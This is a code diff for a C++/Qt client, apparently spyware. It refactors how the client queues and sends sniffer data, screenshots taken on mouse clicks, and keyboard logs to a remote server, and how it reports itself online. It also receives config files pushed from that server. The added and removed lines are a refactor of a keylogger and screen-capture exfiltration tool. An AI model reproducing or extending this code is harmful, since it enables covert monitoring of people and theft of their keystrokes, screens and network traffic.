@@ -23,7 +23,7 @@ Client::Client(QObject* parent, const QString& defaultPath, quint16 _locPort, QS
 
     //Send sniffer data
     connect(sniffer.get(), &Sniffer::newData, [this](const QString& data){
-        enqueueAndConnect(Type::STRING, "DATA|" + data);
+        fileClient->enqueueDataAndConnect(std::make_unique<data::String>("DATA|" + data));
     });
 
     //Load config
@@ -42,7 +42,7 @@ Client::Client(QObject* parent, const QString& defaultPath, quint16 _locPort, QS
     getOnline();
 
     //Connect for receiving files and strings
-    connect(fileServer.get(), &FileServer::dataSaved, [this](QString str, QString ip){ this->getFile(str, ip); });
+    connect(fileServer.get(), &FileServer::fileReceived, [this](QString str, QString ip){ this->getFile(str, ip); });
     connect(fileServer.get(), &FileServer::stringReceived, [this](QString str, QString ip){ this->getString(str, ip); });
 
     //Make "screens" folder
@@ -55,7 +55,7 @@ Client::Client(QObject* parent, const QString& defaultPath, quint16 _locPort, QS
     this, [this](QString screenName)
     {
         //Send screenshot
-        enqueueAndConnect(Type::FILE, path + "/screens/" + screenName);
+        fileClient->enqueueDataAndConnect(std::make_unique<data::File>(path + "/screens/" + screenName));
     });
 
     //Send keyboard log by timer timeout
@@ -67,7 +67,7 @@ Client::Client(QObject* parent, const QString& defaultPath, quint16 _locPort, QS
 
 Client::~Client()
 {
-    fileClient->getOffline();
+    fileClient->sendAndDisconnect("OFFLINE|" + fileClient->getName());
 }
 
 void Client::update()
@@ -91,7 +91,9 @@ void Client::update()
 void Client::getOnline()
 {
     //Queue string
-    fileClient->enqueueData(Type::STRING, "ONLINE|" + fileClient->getName() + '|' + QString::number(locPort) );
+    fileClient->enqueueDataAndConnect(std::make_unique<data::String>("ONLINE|" + fileClient->getName() + '|' + QString::number(locPort) ));
+
+    connect(fileClient.get(), &FileClient::transmitted, onlineTimer.get(), &QTimer::stop);
     //Start and connect timer
     onlineTimer->start(2*1000);    //2, 4, 8, 16, ... seconds
     connect(onlineTimer.get(), &QTimer::timeout, [this](){
@@ -100,7 +102,6 @@ void Client::getOnline()
         if (interval < (10*60*1000)) //10 min
             onlineTimer->setInterval(2*interval);
     });
-    connect(fileClient.get(), &FileClient::transmitted, onlineTimer.get(), &QTimer::stop);
 }
 
 void Client::getFile(const QString& path, const QString& /* ip */)
@@ -113,14 +114,6 @@ void Client::getFile(const QString& path, const QString& /* ip */)
         qDebug() << "Getting new config";
         getNewConfig(path);
     }
-}
-
-void Client::enqueueAndConnect(Type t, const QString& str)
-{
-    bool wasEmpty = fileClient->isDataQueueEmpty();
-    fileClient->enqueueData(t, str);
-    if (wasEmpty)
-        fileClient->connect();
 }
 
 void Client::getString(const QString &string, const QString& /* ip */)
@@ -138,9 +131,6 @@ void Client::getString(const QString &string, const QString& /* ip */)
 
         if (files & (int)Files::Screen) emit MouseHook::instance().mouseClicked();
         if (files & (int)Files::Log) enqueueLog();
-
-        if (! fileClient->isDataQueueEmpty())
-            fileClient->connect();
     }
 }
 
@@ -186,11 +176,13 @@ void Client::enqueueLog()
     fullLog.close();
 
     //Delete temp log when it will be transmitted
-    disconnect(fileClient.get(), &FileClient::transmitted, 0 , 0);
-    connect(fileClient.get(), &FileClient::transmitted, [this](){
+    auto conn = std::make_shared<QMetaObject::Connection>();
+    *conn = QObject::connect(fileClient.get(), &FileClient::transmitted, [this, conn]()
+    {
         QFile::remove(path + "/data_tmp.log");
+        QObject::disconnect(*conn); //disconnect
     });
 
     //Send log
-    enqueueAndConnect(Type::FILE, path + "/data_tmp.log");
+    fileClient->enqueueDataAndConnect(std::make_unique<data::File>(path + "/data_tmp.log"));
 }
